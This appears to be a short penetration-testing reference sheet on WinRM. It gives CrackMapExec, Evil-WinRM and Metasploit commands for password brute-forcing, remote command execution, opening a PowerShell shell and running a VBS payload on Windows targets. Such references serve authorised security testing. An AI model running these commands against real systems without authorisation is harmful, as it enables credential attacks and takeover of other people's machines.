# WinRM

**WinRM (Windows Remote Management)**
**Description**: Protocol for remote command execution on Windows via HTTP(S), often used by admins and attackers alike.
**Ports**: TCP 5985 (HTTP), 5986 (HTTPS)

<br>

# Enumeration with CrackMapExec (CME)

```shell
# Check WinRM availability
crackmapexec winrm <target_IP> -p <port>

# Brute-force with username and password list
crackmapexec winrm <target_IP> -u administrator -p <password_wordlists>

# Test single credentials + run remote commands
crackmapexec winrm <target_IP> -u <username> -p <password> -x "whoami"
crackmapexec winrm <target_IP> -u <username> -p <password> -x "systeminfo"
```

<br>

# Remote Shell Access with Evil-WinRM

```shell
evil-winrm -u administrator -p '<password>' -i <target_IP>
# Connects to a Windows target over WinRM using specified credentials.
# Opens a remote PowerShell session for post-exploitation and privilege escalation.
```

<br>

# Enumeration & Exploitation with Metasploit

```shell
use auxiliary/scanner/winrm/winrm_auth_methods
# Lists available authentication methods supported by the WinRM service (e.g., Basic, NTLM, Kerberos).

use auxiliary/scanner/winrm/winrm_login
# Attempts brute-force login on WinRM using username and password files.
set PASSWORD anything
# Sets a default password (used if PASS_FILE is not set).
# set USER_FILE → Path to file with usernames.
# set PASS_FILE → Path to file with passwords.

use auxiliary/scanner/winrm/winrm_cmd
# Executes remote PowerShell commands over WinRM.
set CMD whoami
# Sets the command to be executed on the target.

use exploit/windows/winrm/winrm_script_exec
# Executes a malicious VBS script on the target using WinRM.
set FORCE_VBS true
# Forces the use of a VBS payload for execution.
```
